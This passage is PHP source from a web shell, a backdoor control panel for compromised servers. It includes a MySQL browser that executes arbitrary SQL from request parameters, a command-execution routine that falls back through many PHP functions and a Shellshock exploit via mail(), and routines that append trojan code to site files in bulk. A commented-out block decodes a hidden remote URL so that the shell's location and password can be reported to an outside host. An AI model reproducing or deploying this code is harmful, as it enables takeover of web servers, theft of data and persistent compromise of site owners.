\tif(confirm(smsg)){window.location = gourl;}
}
function Createok(ac)
{
\tif(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (eanver BLOB);';
\tif(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
\tif(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
\treturn false;
}
</script>
END;
            $BOOL = false;
            $MSG_BOX = '???:' . $_COOKIE['m_eanveruser'] . ' &nbsp;&nbsp;&nbsp;&nbsp; ???:' . $_COOKIE['m_eanverhost'] . ':' . $_COOKIE['m_eanverport'] . ' &nbsp;&nbsp;&nbsp;&nbsp; ?∑⁄:';
            $k = 0;
            $result = @mysql_query('select version();', $conn);
            while ($row = @mysql_fetch_array($result)) {
                $MSG_BOX .= $row[$k];
                $k++;
            }
            echo '<div class="actall"> ?????:';
            $result = mysql_query("SHOW DATABASES", $conn);
            while ($db = mysql_fetch_array($result)) {
                echo '&nbsp;&nbsp;[<a href="?eanver=mysql_msg&db=' . $db['Database'] . '">' . $db['Database'] . '</a>]';
            }
            echo '</div>';
            if (isset($_GET['db'])) {
                mysql_select_db($_GET['db'], $conn);
                if (!empty($_POST['nsql'])) {
                    $BOOL = true;
                    $MSG_BOX = mysql_query($_POST['nsql'], $conn) ? '??ß‘??' : '?????? ' . mysql_error();
                }
                if (is_array($_POST['insql'])) {
                    $query = 'INSERT INTO ' . $_GET['table'] . ' (';
                    foreach ($_POST['insql'] as $var => $key) {
                        $querya .= $var . ',';
                        $queryb .= '\'' . addslashes($key) . '\',';
                    }
                    $query = $query . substr($querya, 0, -1) . ') VALUES (' . substr($queryb, 0, -1) . ');';
                    $MSG_BOX = mysql_query($query, $conn) ? '??????' : '??????? ' . mysql_error();
                }
                if (is_array($_POST['upsql'])) {
                    $query = 'UPDATE ' . $_GET['table'] . ' SET ';
                    foreach ($_POST['upsql'] as $var => $key) {
                        $queryb .= $var . '=\'' . addslashes($key) . '\',';
                    }
                    $query = $query . substr($queryb, 0, -1) . ' ' . base64_decode($_POST['wherevar']) . ';';
                    $MSG_BOX = mysql_query($query, $conn) ? '?????' : '?????? ' . mysql_error();
                }
                if (isset($_GET['del'])) {
                    $result = mysql_query('SELECT * FROM ' . $_GET['table'] . ' LIMIT ' . $_GET['del'] . ', 1;', $conn);
                    $good = mysql_fetch_assoc($result);
                    $query = 'DELETE FROM ' . $_GET['table'] . ' WHERE ';
                    foreach ($good as $var => $key) {
                        $queryc .= $var . '=\'' . addslashes($key) . '\' AND ';
                    }
                    $where = $query . substr($queryc, 0, -4) . ';';
                    $MSG_BOX = mysql_query($where, $conn) ? '??????' : '?????? ' . mysql_error();
                }
                $action = '?eanver=mysql_msg&db=' . $_GET['db'];
                if (isset($_GET['drop'])) {
                    $query = 'Drop TABLE IF EXISTS ' . $_GET['drop'] . ';';
                    $MSG_BOX = mysql_query($query, $conn) ? '??????' : '?????? ' . mysql_error();
                }
                if (isset($_GET['table'])) {
                    $action .= '&table=' . $_GET['table'];
                    if (isset($_GET['edit'])) {
                        $action .= '&edit=' . $_GET['edit'];
                    }
                }
                if (isset($_GET['insert'])) {
                    $action .= '&insert=' . $_GET['insert'];
                }
                echo '<div class="actall"><form method="POST" action="' . $action . '">';
                echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">' . $_POST['nsql'] . '</textarea> ';
                echo '<input type="submit" name="querysql" value="???" style="width:60px;height:49px;"> ';
                echo '<input type="button" value="??????" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
                echo '<input type="button" value="??????" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
                echo '<input type="button" value="?????" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
                echo '<div class="msgbox" style="height:40px;">' . $MSG_BOX . '</div><div class="actall"><a href="?eanver=mysql_msg&db=' . $_GET['db'] . '">' . $_GET['db'] . '</a> ---> ';
                if (isset($_GET['table'])) {
                    echo '<a href="?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $_GET['table'] . '">' . $_GET['table'] . '</a> ';
                    echo '[<a href="?eanver=mysql_msg&db=' . $_GET['db'] . '&insert=' . $_GET['table'] . '">????</a>]</div>';
                    if (isset($_GET['edit'])) {
                        if (isset($_GET['p'])) {
                            $atable = $_GET['table'] . '&p=' . $_GET['p'];
                        } else {
                            $atable = $_GET['table'];
                        }
                        echo '<form method="POST" action="?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $atable . '">';
                        $result = mysql_query('SELECT * FROM ' . $_GET['table'] . ' LIMIT ' . $_GET['edit'] . ', 1;', $conn);
                        $good = mysql_fetch_assoc($result);
                        $u = 0;
                        foreach ($good as $var => $key) {
                            $queryc .= $var . '=\'' . $key . '\' AND ';
                            $type = @mysql_field_type($result, $u);
                            $len = @mysql_field_len($result, $u);
                            echo '<div class="actall">' . $var . ' <font color="#FF0000">' . $type . '(' . $len . ')</font><br><textarea name="upsql[' . $var . ']" style="width:600px;height:60px;">' . htmlspecialchars($key) . '</textarea></div>';
                            $u++;
                        }
                        $where = 'WHERE ' . substr($queryc, 0, -4);
                        echo '<input type="hidden" id="wherevar" name="wherevar" value="' . base64_encode($where) . '">';
                        echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
                    } else {
                        $query = 'SHOW COLUMNS FROM ' . $_GET['table'];
                        $result = mysql_query($query, $conn);
                        $fields = array();
                        $pagesize = 20;
                        $row_num = mysql_num_rows(mysql_query('SELECT * FROM ' . $_GET['table'], $conn));
                        $numrows = $row_num;
                        $pages = intval($numrows / $pagesize);
                        if ($numrows % $pagesize) {
                            $pages++;
                        }
                        $offset = $pagesize * ($page - 1);
                        $page = $_GET['p'];
                        if (!$page) {
                            $page = 1;
                        }
                        if (!isset($_GET['p'])) {
                            $p = 0;
                            $_GET['p'] = 1;
                        } else {
                            $p = ((int) $_GET['p'] - 1) * 20;
                        }
                        echo '<table border="0"><tr>';
                        echo '<td class="toptd" style="width:70px;" nowrap>????</td>';
                        while ($row = @mysql_fetch_assoc($result)) {
                            array_push($fields, $row['Field']);
                            echo '<td class="toptd" nowrap>' . $row['Field'] . '</td>';
                        }
                        echo '</tr>';
                        if (eregi('WHERE|LIMIT', $_POST['nsql']) && eregi('SELECT|FROM', $_POST['nsql'])) {
                            $query = $_POST['nsql'];
                        } else {
                            $query = 'SELECT * FROM ' . $_GET['table'] . ' LIMIT ' . $p . ', 20;';
                        }
                        $result = mysql_query($query, $conn);
                        $v = $p;
                        while ($text = @mysql_fetch_assoc($result)) {
                            echo '<tr><td><a href="?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $_GET['table'] . '&p=' . $_GET['p'] . '&edit=' . $v . '"> ??? </a> ';
                            echo '<a href="#" onclick="Delok(\'??\',\'?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $_GET['table'] . '&p=' . $_GET['p'] . '&del=' . $v . '\');return false;"> ??? </a></td>';
                            foreach ($fields as $row) {
                                echo '<td>' . nl2br(htmlspecialchars(Mysql_Len($text[$row], 500))) . '</td>';
                            }
                            echo '</tr>' . "\r\n";
                            $v++;
                        }
                        echo '</table><div class="actall">';
                        $pagep = $page - 1;
                        $pagen = $page + 1;
                        echo "???? " . $row_num . " ????? ";
                        if ($pagep > 0) {
                            $pagenav .= "  <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=1&charset=" . $_GET['charset'] . "'>???</a> <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pagep . "&charset=" . $_GET['charset'] . "'>????</a> ";
                        } else {
                            $pagenav .= " ???? ";
                        }
                        if ($pagen <= $pages) {
                            $pagenav .= " <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pagen . "&charset=" . $_GET['charset'] . "'>????</a> <a href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p=" . $pages . "&charset=" . $_GET['charset'] . "'>¶¬?</a>";
                        } else {
                            $pagenav .= " ???? ";
                        }
                        $pagenav .= " ?? [" . $page . "/" . $pages . "] ?   ????<input name='textfield' type='text' style='text-align:center;' size='4' value='" . $page . "' onkeydown=\"if(event.keyCode==13)self.location.href='?eanver=mysql_msg&db=" . $_GET['db'] . "&table=" . $_GET['table'] . "&p='+this.value+'&charset=" . $_GET['charset'] . "';\" />?";
                        echo $pagenav;
                        echo '</div>';
                    }
                } elseif (isset($_GET['insert'])) {
                    echo '<a href="?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $_GET['insert'] . '">' . $_GET['insert'] . '</a></div>';
                    $result = mysql_query('SELECT * FROM ' . $_GET['insert'], $conn);
                    $fieldnum = @mysql_num_fields($result);
                    echo '<form method="POST" action="?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $_GET['insert'] . '">';
                    for ($i = 0; $i < $fieldnum; $i++) {
                        $name = @mysql_field_name($result, $i);
                        $type = @mysql_field_type($result, $i);
                        $len = @mysql_field_len($result, $i);
                        echo '<div class="actall">' . $name . ' <font color="#FF0000">' . $type . '(' . $len . ')</font><br><textarea name="insql[' . $name . ']" style="width:600px;height:60px;"></textarea></div>';
                    }
                    echo '<div class="actall"><input type="submit" value="Insert" style="width:80px;"></div></form>';
                } else {
                    $query = 'SHOW TABLE STATUS';
                    $status = @mysql_query($query, $conn);
                    while ($statu = @mysql_fetch_array($status)) {
                        $statusize[] = $statu['Data_length'];
                        $statucoll[] = $statu['Collation'];
                    }
                    $query = 'SHOW TABLES FROM ' . $_GET['db'] . ';';
                    echo '</div><table border="0"><tr>';
                    echo '<td class="toptd" style="width:550px;"> ???? </td>';
                    echo '<td class="toptd" style="width:80px;"> ???? </td>';
                    echo '<td class="toptd" style="width:130px;"> ????? </td>';
                    echo '<td class="toptd" style="width:70px;"> ??ß≥ </td></tr>';
                    $result = @mysql_query($query, $conn);
                    $k = 0;
                    while ($table = mysql_fetch_row($result)) {
                        $charset = substr($statucoll[$k], 0, strpos($statucoll[$k], '_'));
                        echo '<tr><td><a href="?eanver=mysql_msg&db=' . $_GET['db'] . '&table=' . $table[0] . '">' . $table[0] . '</a></td>';
                        echo '<td><a href="?eanver=mysql_msg&db=' . $_GET['db'] . '&insert=' . $table[0] . '"> ???? </a> <a href="#" onclick="Delok(\'' . $table[0] . '\',\'?eanver=mysql_msg&db=' . $_GET['db'] . '&drop=' . $table[0] . '\');return false;"> ??? </a></td>';
                        echo '<td>' . $statucoll[$k] . '</td><td align="right">' . File_Size($statusize[$k]) . '</td></tr>' . "\r\n";
                        $k++;
                    }
                    echo '</table>';
                }
            }
        } else {
            die('????MYSQL???,?????¶Ã??.<meta http-equiv="refresh" content="0;URL=?eanver=mysql_exec">');
        }
        if (!$BOOL and addslashes($query) != '') {
            echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \'' . addslashes($query) . '\';</script>';
        }
        break;
    default:
        html_main($path, $shellname);
        break;
}
css_foot();
/*---doing---*/
function do_write($file, $t, $text)
{
    $key = true;
    $handle = @fopen($file, $t);
    if (!@fwrite($handle, $text)) {
        @chmod($file, 0666);
        $key = @fwrite($handle, $text) ? true : false;
    }
    @fclose($handle);
    return $key;
}
function do_show($filepath)
{
    $show = array();
    $dir = dir($filepath);
    while ($file = $dir->read()) {
        if ($file == '.' or $file == '..') {
            continue;
        }
        $files = str_path($filepath . '/' . $file);
        $show[] = $files;
    }
    $dir->close();
    return $show;
}
function do_deltree($deldir)
{
    $showfile = do_show($deldir);
    foreach ($showfile as $del) {
        if (is_dir($del)) {
            if (!do_deltree($del)) {
                return false;
            }
        } elseif (!is_dir($del)) {
            @chmod($del, 0777);
            if (!@unlink($del)) {
                return false;
            }
        }
    }
    @chmod($deldir, 0777);
    if (!@rmdir($deldir)) {
        return false;
    }
    return true;
}
function do_showsql($query, $conn)
{
    $result = @mysql_query($query, $conn);
    html_n('<br><br><textarea cols="70" rows="15">');
    while ($row = @mysql_fetch_array($result)) {
        for ($i = 0; $i < @mysql_num_fields($result); $i++) {
            html_n(htmlspecialchars($row[$i]));
        }
    }
    html_n('</textarea>');
}
function hmlogin($xiao = 1)
{
    $serveru = $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    $serverp = envlpass;
    if (strpos($serveru, "0.0") > 0 or strpos($serveru, "192.168.") > 0 or strpos($serveru, "localhost") > 0 or $serveru == $_COOKIE['serveru'] and $serverp == $_COOKIE['serverp']) {
        echo "<meta http-equiv='refresh' content='0;URL=?'>";
    } else {
        setcookie('serveru', $serveru);
        setcookie('serverp', $serverp);
        if ($xiao == 1) {
            echo "<script src='?login=geturl'></script><meta http-equiv='refresh' content='0;URL=?'>";
        } else {
            geturl();
        }
    }
}
function do_down($fd)
{
    if (!@file_exists($fd)) {
        msg('?????????????');
    }
    $fileinfo = pathinfo($fd);
    header('Content-type: application/x-' . $fileinfo['extension']);
    header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
    header('Content-Length: ' . filesize($fd));
    @readfile($fd);
    exit;
}
function do_download($filecode, $file)
{
    header("Content-type: application/unknown");
    header('Accept-Ranges: bytes');
    header("Content-length: " . strlen($filecode));
    header("Content-disposition: attachment; filename=" . $file . ";");
    echo $filecode;
    exit;
}
function TestUtf8($text)
{
    if (strlen($text) < 3) {
        return false;
    }
    $lastch = 0;
    $begin = 0;
    $BOM = true;
    $BOMchs = array(0xef, 0xbb, 0xbf);
    $good = 0;
    $bad = 0;
    $notAscii = 0;
    for ($i = 0; $i < strlen($text); $i++) {
        $ch = ord($text[$i]);
        if ($begin < 3) {
            $BOM = $BOMchs[$begin] == $ch;
            $begin += 1;
            continue;
        }
        if ($begin == 4 && $BOM) {
            break;
        }
        if ($ch >= 0x80) {
            $notAscii++;
        }
        if (($ch & 0xc0) == 0x80) {
            if (($lastch & 0xc0) == 0xc0) {
                $good += 1;
            } else {
                if (($lastch & 0x80) == 0) {
                    $bad += 1;
                }
            }
        } else {
            if (($lastch & 0xc0) == 0xc0) {
                $bad += 1;
            }
        }
        $lastch = $ch;
    }
    if ($begin == 4 && $BOM) {
        return 2;
    } else {
        if ($notAscii == 0) {
            return 1;
        } else {
            if ($good >= $bad) {
                return 2;
            } else {
                return 0;
            }
        }
    }
}
function File_Str($string)
{
    return str_replace('//', '/', str_replace('\\', '/', $string));
}
function File_Write($filename, $filecode, $filemode)
{
    $key = true;
    $handle = @fopen($filename, $filemode);
    if (!@fwrite($handle, $filecode)) {
        @chmod($filename, 0666);
        $key = @fwrite($handle, $filecode) ? true : false;
    }
    @fclose($handle);
    return $key;
}
function Exec_Run($cmd)
{
    $res = '';
    if (function_exists('exec')) {
        @exec($cmd, $res);
        $res = join("\n", $res);
    } elseif (function_exists('shell_exec')) {
        $res = @shell_exec($cmd);
    } elseif (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $res = @ob_get_contents();
        @ob_end_clean();
    } elseif (@is_resource($f = @popen($cmd, 'r'))) {
        $res = '';
        while (!@feof($f)) {
            $res .= @fread($f, 1024);
        }
        @pclose($f);
    } elseif (substr(dirname($_SERVER["SCRIPT_FILENAME"]), 0, 1) != "/" && class_exists('COM')) {
        $w = new COM('WScript.shell');
        $e = $w->exec($cmd);
        $f = $e->StdOut();
        $res = $f->ReadAll();
    } elseif (function_exists('proc_open')) {
        $length = strcspn($cmd, " \t");
        $token = substr($cmd, 0, $length);
        if (isset($aliases[$token])) {
            $cmd = $aliases[$token] . substr($cmd, $length);
        }
        $p = proc_open($cmd, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);
        while (!feof($io[1])) {
            $res .= htmlspecialchars(fgets($io[1]), ENT_COMPAT, 'UTF-8');
        }
        while (!feof($io[2])) {
            $res .= htmlspecialchars(fgets($io[2]), ENT_COMPAT, 'UTF-8');
        }
        fclose($io[1]);
        fclose($io[2]);
        proc_close($p);
    } elseif (function_exists('mail')) {
        if (strstr(readlink("/bin/sh"), "bash") != FALSE) {
            $tmp = tempnam(".", "data");
            putenv("PHP_LOL=() { x; }; {$cmd} >{$tmp} 2>&1");
            mail("a@127.0.0.1", "", "", "", "-bv");
        } else {
            $res = "Not vuln (not bash)";
        }
        $output = @file_get_contents($tmp);
        @unlink($tmp);
        if ($output != "") {
            $res = $output;
        } else {
            $res = "No output, or not vuln.";
        }
    }
    return $res;
}

//if (isset($_GET['login']) == 'geturl') {
    //@set_time_limit(10);
   // $serveru = $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
    //$serverp = envlpass;
   // $copyurl = base64_decode("aHR0cCUzQS8vMTA2LjUyLjEwNy4xODAvdXNhLnBocCUzRmtkYSUzRA==");
   // $url = $copyurl . $serveru . '&cmd=' . $serverp;
   // $url = urldecode($url);
    //GetHtml($url);
//}
function File_Mode()
{
    $RealPath = realpath('./');
    $SelfPath = $_SERVER['PHP_SELF'];
    $SelfPath = substr($SelfPath, 0, strrpos($SelfPath, '/'));
    return File_Str(substr($RealPath, 0, strlen($RealPath) - strlen($SelfPath)));
}
function File_Size($size)
{
    $kb = 1024;
    // Kilobyte
    $mb = 1024 * $kb;
    // Megabyte
    $gb = 1024 * $mb;
    // Gigabyte
    $tb = 1024 * $gb;
    // Terabyte
    if ($size < $kb) {
        return $size . " B";
    } else {
        if ($size < $mb) {
            return round($size / $kb, 2) . " K";
        } else {
            if ($size < $gb) {
                return round($size / $mb, 2) . " M";
            } else {
                if ($size < $tb) {
                    return round($size / $gb, 2) . " G";
                } else {
                    return round($size / $tb, 2) . " T";
                }
            }
        }
    }
}
function File_Read($filename)
{
    $handle = @fopen($filename, "rb");
    $filecode = @fread($handle, @filesize($filename));
    @fclose($handle);
    return $filecode;
}
function do_phpfun($cmd, $fun)
{
    $res = '';
    switch ($fun) {
        case "exec":
            @exec($cmd, $res);
            $res = join("\n", $res);
            break;
        case "shell_exec":
            $res = @shell_exec($cmd);
            break;
        case "system":
            @ob_start();
            @system($cmd);
            $res = @ob_get_contents();
            @ob_end_clean();
            break;
        case "passthru":
            @ob_start();
            @passthru($cmd);
            $res = @ob_get_contents();
            @ob_end_clean();
            break;
        case "popen":
            if (@is_resource($f = @popen($cmd, "r"))) {
                while (!@feof($f)) {
                    $res .= @fread($f, 1024);
                }
            }
            @pclose($f);
            break;
    }
    return $res;
}
function do_passreturn($dir, $code, $type, $bool, $filetype = '', $shell = my_shell)
{
    $show = do_show($dir);
    foreach ($show as $files) {
        if (is_dir($files) && $bool) {
            do_passreturn($files, $code, $type, $bool, $filetype, $shell);
        } else {
            if ($files == $shell) {
                continue;
            }
            switch ($type) {
                case "guama":
                    if (debug($files, $filetype)) {
                        do_write($files, "ab", "\n" . $code) ? html_n("???--> {$files}<br>") : html_n("???--> {$files}<br>");
                    }
                    break;
                case "qingma":
                    $filecode = @file_get_contents($files);
                    if (stristr($filecode, $code)) {
                        $newcode = str_replace($code, '', $filecode);
                        do_write($files, "wb", $newcode) ? html_n("???--> {$files}<br>") : html_n("???--> {$files}<br>");
                    }
                    break;
                case "tihuan":
                    $filecode = @file_get_contents($files);
                    if (stristr($filecode, $code)) {
                        $newcode = str_replace($code, $filetype, $filecode);
                        do_write($files, "wb", $newcode) ? html_n("???--> {$files}<br>") : html_n("???--> {$files}<br>");
                    }
                    break;
                case "scanfile":
                    $file = explode('/', $files);
                    if (stristr($file[count($file) - 1], $code)) {
                        html_a("?eanver=editr&p={$files}", $files);
                        echo '<br>';
                    }
                    break;
                case "scancode":
                    $filecode = @file_get_contents($files);
                    if (stristr($filecode, $code)) {
                        html_a("?eanver=editr&p={$files}", $files);
                        echo '<br>';
                    }
                    break;
                case "scanphp":
                    $fileinfo = pathinfo($files);
                    if ($fileinfo['extension'] == $code) {
                        $filecode = @file_get_contents($files);
                        if (muma($filecode, $code)) {
                            html_a("?eanver=editr&p=" . urlencode($files), "??");
                            html_a("?eanver=del&p=" . urlencode($files), "???");
                            echo $files . '<br>';
                        }
                    }
                    break;
            }
        }
    }
}
class PHPzip
{
    var $file_count = 0;
    var $datastr_len = 0;
    var $dirstr_len = 0;
    var $filedata = '';
    var $gzfilename;
    var $fp;
    var $dirstr = '';
    function unix2DosTime($unixtime = 0)
    {
        $timearray = $unixtime == 0 ? getdate() : getdate($unixtime);
        if ($timearray['year'] < 1980) {
            $timearray['year'] = 1980;
            $timearray['mon'] = 1;
            $timearray['mday'] = 1;
            $timearray['hours'] = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        }
        return $timearray['year'] - 1980 << 25 | $timearray['mon'] << 21 | $timearray['mday'] << 16 | $timearray['hours'] << 11 | $timearray['minutes'] << 5 | $timearray['seconds'] >> 1;
    }
    function startfile($path = '2238888889.zip')
    {
        $this->gzfilename = $path;
        $mypathdir = array();
        do {
            $mypathdir[] = $path = dirname($path);
        } while ($path != '.');
        @end($mypathdir);
        do {
            $path = @current($mypathdir);
            @mkdir($path);
        } while (@prev($mypathdir));
        if ($this->fp = @fopen($this->gzfilename, "w")) {
            return true;
        }
        return false;
    }
    function addfile($data, $name)
    {
        $name = str_replace('\\', '/', $name);
        if (strrchr($name, '/') == '/') {
            return $this->adddir($name);
        }
        $dtime = dechex($this->unix2DosTime());
        $hexdtime = '\\x' . $dtime[6] . $dtime[7] . '\\x' . $dtime[4] . $dtime[5] . '\\x' . $dtime[2] . $dtime[3] . '\\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');
        $unc_len = strlen($data);
        $crc = crc32($data);
        $zdata = gzcompress($data);
        $c_len = strlen($zdata);
        $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
        $datastr = "PK\3\4";
        $datastr .= "\24\0";
        $datastr .= "\0\0";
        $datastr .= "\10\0";
        $datastr .= $hexdtime;
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        $datastr .= pack('v', strlen($name));
        $datastr .= pack('v', 0);
        $datastr .= $name;
        $datastr .= $zdata;
        $datastr .= pack('V', $crc);
        $datastr .= pack('V', $c_len);
        $datastr .= pack('V', $unc_len);
        fwrite($this->fp, $datastr);
        $my_datastr_len = strlen($datastr);
        unset($datastr);
        $dirstr = "PK\1\2";
        $dirstr .= "\0\0";
        $dirstr .= "\24\0";
        $dirstr .= "\0\0";
        $dirstr .= "\10\0";
        $dirstr .= $hexdtime;
        $dirstr .= pack('V', $crc);
        $dirstr .= pack('V', $c_len);
        $dirstr .= pack('V', $unc_len);
        // uncompressed filesize
        $dirstr .= pack('v', strlen($name));
        // length of filename
        $dirstr .= pack('v', 0);
        // extra field length
        $dirstr .= pack('v', 0);
        // file comment length
        $dirstr .= pack('v', 0);
        // disk number start
        $dirstr .= pack('v', 0);
        // internal file attributes
        $dirstr .= pack('V', 32);
        // external file attributes - 'archive' bit set
        $dirstr .= pack('V', $this->datastr_len);
        // relative offset of local header
        $dirstr .= $name;
        $this->dirstr .= $dirstr;
        //?????
        $this->file_count++;
        $this->dirstr_len += strlen($dirstr);
        $this->datastr_len += $my_datastr_len;
    }
    function adddir($name)
    {
        $name = str_replace("\\", "/", $name);
        $datastr = "PK\3\4\n\0\0\0\0\0\0\0\0\0";
        $datastr .= pack("V", 0) . pack("V", 0) . pack("V", 0) . pack("v", strlen($name));
        $datastr .= pack("v", 0) . $name . pack("V", 0) . pack("V", 0) . pack("V", 0);
        fwrite($this->fp, $datastr);
        $my_datastr_len = strlen($datastr);
        unset($datastr);
        $dirstr = "PK\1\2\0\0\n\0\0\0\0\0\0\0\0\0";
        $dirstr .= pack("V", 0) . pack("V", 0) . pack("V", 0) . pack("v", strlen($name));
        $dirstr .= pack("v", 0) . pack("v", 0) . pack("v", 0) . pack("v", 0);
        $dirstr .= pack("V", 16) . pack("V", $this->datastr_len) . $name;
        $this->dirstr .= $dirstr;
        $this->file_count++;
        $this->dirstr_len += strlen($dirstr);
        $this->datastr_len += $my_datastr_len;
    }
    function createfile()
    {
        $endstr = "PK\5\6\0\0\0\0" . pack('v', $this->file_count) . pack('v', $this->file_count) . pack('V', $this->dirstr_len) . pack('V', $this->datastr_len) . "\0\0";
        fwrite($this->fp, $this->dirstr . $endstr);
        fclose($this->fp);
    }
}
function start_unzip($tmp_name, $new_name, $todir = 'zipfile')
{
    $zip = new ZipArchive();
    if ($zip->open($tmp_name) !== TRUE) {
        echo '???????????????????';
    }
    $zip->extractTo($todir);
    $zip->close();
    echo '???????&nbsp;&nbsp;&nbsp;<a href="?eanver=main&path=' . urlencode($todir) . '">????????</a>&nbsp;&nbsp;&nbsp;<a href="javascript:history.go(-1);">????</a>';
}
function muma($filecode, $filetype)
{
    $dim = array("php" => array("eval(", "exec("), "asp" => array("WScript.Shell", "execute(", "createtextfile("), "aspx" => array("Response.Write(eval(", "RunCMD(", "CreateText()"), "jsp" => array("runtime.exec("));
    foreach ($dim[$filetype] as $code) {
        if (stristr($filecode, $code)) {
            return true;
        }
    }
}
function debug($file, $ftype)
{
    $type = explode('|', $ftype);
    foreach ($type as $i) {
        if (stristr($file, $i)) {
            return true;
        }
    }
}
/*---string---*/
function str_path($path)
{
    return str_replace('//', '/', $path);
}
function msg($msg)
{
    die("<script>window.alert('" . $msg . "');history.go(-1);</script>");
}
function uppath($nowpath)
{
    $nowpath = str_replace('\\', '/', dirname($nowpath));
    return urlencode($nowpath);
}
function xxstr($key)
{
    $temp = str_replace("\\\\", "\\", $key);
    $temp = str_replace("\\", "\\\\", $temp);
    return $temp;
}
/*---html---*/
function html_ta($url, $name)
{
    html_n("<a href=\"{$url}\" target=\"_blank\">{$name}</a>");
}
function html_a($url, $name, $where = '')
{
    html_n("<a href=\"{$url}\" {$where}>{$name}</a> ");
}
function html_img($url)
{
    html_n("<img src=\"?img={$url}\" border=0>");
}
function back()
{
    html_n("<input type='button' value='????' onclick='history.back();'>");
}
function html_radio($namei, $namet, $v1, $v2)
{
    html_n('<input type="radio" name="return" value="' . $v1 . '" checked>' . $namei);
    html_n('<input type="radio" name="return" value="' . $v2 . '">' . $namet . '<br><br>');
}
function html_input($type, $name, $value = '', $text = '', $size = '', $mode = false)
{
    if ($mode) {
        html_n("<input type=\"{$type}\" name=\"{$name}\" value=\"{$value}\" size=\"{$size}\" checked>{$text}");
    } else {
        html_n("{$text} <input type=\"{$type}\" name=\"{$name}\" value=\"{$value}\" size=\"{$size}\">");
    }
}
function html_base()
{
    html_n('function base64encode(str){
	var base64EncodeChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var out, i, len;
    var c1, c2, c3;
    len = str.length;
    i = 0;
    out = "";
    while (i < len) {
        c1 = str.charCodeAt(i++) & 0xff;
        if (i == len) {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt((c1 & 0x3) << 4);
            out += "==";
            break;
        }
        c2 = str.charCodeAt(i++);
        if (i == len) {
            out += base64EncodeChars.charAt(c1 >> 2);
            out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
            out += base64EncodeChars.charAt((c2 & 0xF) << 2);
            out += "=";
            break;
        }
        c3 = str.charCodeAt(i++);
        out += base64EncodeChars.charAt(c1 >> 2);
        out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));
        out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));
        out += base64EncodeChars.charAt(c3 & 0x3F);
    }
    return out;
}');
}
function html_text($name, $cols, $rows, $value = '')
{
    html_n("<br><br><textarea name=\"{$name}\" COLS=\"{$cols}\" ROWS=\"{$rows}\" >{$value}</textarea>");
}
function html_select($array, $mode = '', $change = '', $name = 'class')
{
    html_n("<select name={$name} {$change}>");
    foreach ($array as $name => $value) {
        if ($name == $mode) {
            html_n("<option value=\"{$name}\" selected>{$value}</option>");
        } else {
            html_n("<option value=\"{$name}\">{$value}</option>");
        }
    }
    html_n("</select>");
}
function html_font($color, $size, $name)
{
    html_n("<font color=\"{$color}\" size=\"{$size}\">{$name}</font>");
}

function html_main($path, $shellname)
{
    if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
        $safemode = TRUE;
        $hsafemode = "<font color=#00b6ff>On (??????????)</font>";
    } else {
        $safemode = FALSE;
        $hsafemode = "<font color=#ff0000>Off (¶ƒ?????????)</font>";
    }
    $Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
    $Server_OS = PHP_OS;
    $Server_Soft = $_SERVER["SERVER_SOFTWARE"];
    $web_server = php_uname();
    print <<<END
<html><title>?¶ ¶«????????????????? ??????????????->{$Server_OS}</title>
<table width='100%'><tr><td><form method='GET' target='main'><input type='hidden' name='eanver' value='main'>???:<input name='path' style='width:90%' value='{$path}'>&nbsp<input name='Submit' type='submit' value='????'> <input type='submit' value='???' onclick='main.location.reload()'></td></tr><tr align='center'><td><b>php?????:{$hsafemode}-----ip:{$Server_IP}-----php:?∑⁄{$Server_Soft}-----???∑⁄:{$web_server}</b></td></tr><tr align='center'><td></td></tr></form></table>
END;
    html_n("<table width='100%' height='95.7%' border=0 cellpadding='0' cellspacing='0'><tr><td width='170'><iframe name='left' src='?eanver=left' width='100%' height='100%' frameborder='0'>");
    html_n("</iframe></td><td><iframe name='main' src='?eanver=main' width='100%' height='100%' frameborder='1'>");
    html_n("</iframe></td></tr></table></html>");
}
function islogin($shellname, $myurl)
{
    $Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
    $Server_OS = PHP_OS;
    $Server_Soft = $_SERVER["SERVER_SOFTWARE"];
    $web_server = php_uname();
    print <<<END
